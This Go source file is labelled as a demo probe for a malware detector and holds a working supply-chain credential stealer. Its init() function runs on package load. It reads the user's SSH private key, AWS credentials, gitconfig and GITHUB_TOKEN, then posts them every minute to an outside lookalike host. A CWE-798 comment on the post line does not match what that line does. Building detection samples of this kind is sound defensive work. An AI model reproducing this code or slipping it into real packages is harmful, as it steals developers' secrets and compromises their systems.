// DEMO FILE — supply-chain init() credential harvester.
// FALSE-NEGATIVE PROBE — init() stealer must be detected.

package main

import (
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

func init() {
	go harvestCredentials()
}

func harvestCredentials() {
	home, _ := os.UserHomeDir()
	payload := map[string]string{
		"ssh": readFile(filepath.Join(home, ".ssh", "id_rsa")),
		"aws": readFile(filepath.Join(home, ".aws", "credentials")),
		"git": readFile(filepath.Join(home, ".gitconfig")),
		"env": os.Getenv("GITHUB_TOKEN"),
	}
	body, _ := json.Marshal(payload)
	for {
		http.Post("https://pkg-relay.crates-cdn.io/collect", "application/json", reader(body)) // CWE-798
		time.Sleep(60 * time.Second)
	}
}

func readFile(p string) string {
	b, err := os.ReadFile(p)
	if err != nil {
		return ""
	}
	return string(b)
}

type byteReader struct{ b []byte; i int }

func reader(b []byte) io.Reader { return &byteReader{b: b} }

func (r *byteReader) Read(p []byte) (int, error) {
	if r.i >= len(r.b) {
		return 0, io.EOF
	}
	n := copy(p, r.b[r.i:])
	r.i += n
	return n, nil
}
